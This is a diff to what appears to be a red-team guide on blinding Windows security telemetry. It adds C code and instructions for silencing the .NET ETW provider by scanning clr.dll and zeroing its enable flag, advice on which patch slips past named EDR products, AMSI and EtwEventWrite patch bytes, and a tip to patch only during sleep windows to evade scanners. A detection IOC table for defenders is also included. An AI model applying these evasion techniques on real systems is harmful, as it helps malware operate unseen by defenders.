@@ -76,6 +76,70 @@ avoid the VirtualProtect IAT call that some EDRs instrument.
 For ODPC: global patch is simpler and effective against most lab EDRs. Per-provider
 is necessary when the EDR monitors its own ETW callback registration.
 
+## Per-provider patch: targeting DotNETRuntime
+
+Instead of patching `EtwEventWrite` globally, you can disable only the
+`Microsoft-Windows-DotNETRuntime` provider in the CLR — silencing .NET telemetry
+while leaving all other ETW traffic intact.
+
+The CLR registers its ETW provider during startup. The registration stores an
+`_ETW_PROVIDER_CONTEXT` (internal struct) that includes an enable callback and an
+enabled-level mask. Zeroing the enable mask causes the provider to emit nothing.
+
+**Approach 1 — EventSetInformation (documented API):**
+```c
+#include <evntprov.h>
+
+// Disable the DotNETRuntime provider in the calling process
+// This requires the REGHANDLE — obtain it from the CLR's provider registration.
+// Signature: EventSetInformation(REGHANDLE, EVENT_INFO_CLASS, PVOID Buffer, ULONG Size)
+// EVENT_PROVIDER_BINARY_TRACKING = 3 — use to suppress provider entirely
+// Note: some EDRs monitor EventSetInformation calls to detect this pattern.
+```
+
+**Approach 2 — Memory scan for provider GUID (stealthier):**
+
+The CLR stores the `Microsoft-Windows-DotNETRuntime` GUID in `clr.dll`. Scan
+for it, then back-reference to the provider registration struct:
+
+```c
+// DotNETRuntime provider GUID bytes (little-endian in memory):
+// {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
+static const BYTE DOTNET_PROVIDER_GUID[] = {
+    0x23, 0x0D, 0x3C, 0xE1, 0xBC, 0xCC, 0x12, 0x4E,
+    0x93, 0x1B, 0xD9, 0xCC, 0x2E, 0xEE, 0x27, 0xE4
+};
+
+PBYTE ScanForProviderGuid(HMODULE hClr) {
+    // Walk the module's .data section looking for the GUID bytes
+    // Return pointer to the GUID; the _ETW_PROVIDER_CONTEXT ptr is nearby (+/- offset)
+    // Offset varies by CLR version — verify in x64dbg against the target .NET version
+    PBYTE pBase = (PBYTE)hClr;
+    // ... section scan omitted for brevity — see edr-test-loop for verification workflow
+    return NULL;
+}
+
+void DisableDotNetEtw(void) {
+    HMODULE hClr = GetModuleHandleA("clr.dll");
+    if (!hClr) hClr = GetModuleHandleA("coreclr.dll");  // .NET 5+
+    if (!hClr) return;  // CLR not loaded — ETW not active yet
+
+    PBYTE pGuid = ScanForProviderGuid(hClr);
+    if (!pGuid) return;
+
+    // The provider context struct is at a known offset from the GUID in .data
+    // Set the IsEnabled flag to 0 — provider emits no events
+    // DWORD* pIsEnabled = (DWORD*)(pGuid + OFFSET_IS_ENABLED);
+    // *pIsEnabled = 0;
+    // VirtualProtect needed if section is not writable
+}
+```
+
+**When to use per-provider vs global:**
+- Lab EDRs / Sophos / Bitdefender: global `EtwEventWrite` patch is sufficient
+- CrowdStrike / MDE: global patch is detected by integrity scanning — per-provider
+  or `EtwEventWriteFull` patch is lower-profile; neither bypasses kernel callbacks
+
 ## AMSI patch (related)
 
 AMSI uses ETW internally but also has its own scan interface. Patch both for PowerShell:
@@ -114,6 +178,54 @@ telemetry (process/thread/image events). Combine with:
 - Indirect syscalls to reduce API call visibility
 - Call stack spoofing to obscure the call origin
 - Caro-Kann style injection to reduce the EDR's scan window
+
+## ETW patch detection signatures
+
+Memory scanners detect ETW patches by comparing in-memory ntdll against the on-disk
+copy. The canonical signatures and what they look for:
+
+### Global EtwEventWrite patch
+**Normal first bytes of `EtwEventWrite` (unpatched):**
+```
+4C 8B DC    mov r11, rsp          ; first instruction in most builds
+49 89 4B 08 mov [r11+8h], rcx
+...
+```
+
+**Patched (xor eax,eax; ret):**
+```
+33 C0       xor eax, eax          ; ← flagged: first 3 bytes are not 4C 8B DC
+C3          ret
+```
+
+**What scanners do:** hash or byte-compare the first 8–16 bytes of `EtwEventWrite`
+against a known-good reference. Mismatch = patch detected.
+
+### AMSI patch
+**Normal `AmsiScanBuffer` first bytes:**
+```
+48 89 5C 24 08  mov [rsp+8], rbx
+```
+
+**Patched:**
+```
+B8 57 00 07 80  mov eax, 80070057h  ; ← flagged
+C3              ret
+```
+
+### Detection IOCs for blue teams / scanner rules
+
+| IOC | Description |
+|-----|-------------|
+| `33 C0 C3` at offset 0 of `ntdll!EtwEventWrite` | Global xor-ret patch |
+| `B8 57 00 07 80 C3` at offset 0 of `amsi!AmsiScanBuffer` | AMSI patch |
+| `VirtualProtect` + `GetProcAddress("ntdll", "EtwEventWrite")` in close sequence | ETW patch setup via IAT |
+| `NtProtectVirtualMemory` call followed by write to ntdll image range | Syscall-based patch (stealthier) |
+| Module hash mismatch on ntdll.dll (memory vs disk) | Any ntdll patch |
+
+**Evasion:** Re-patch only during the sleep window and restore immediately after.
+A scanner that runs between patch and restore will see the modified bytes; minimise
+the patch window.
 
 ## Verifying the ETW patch worked
 
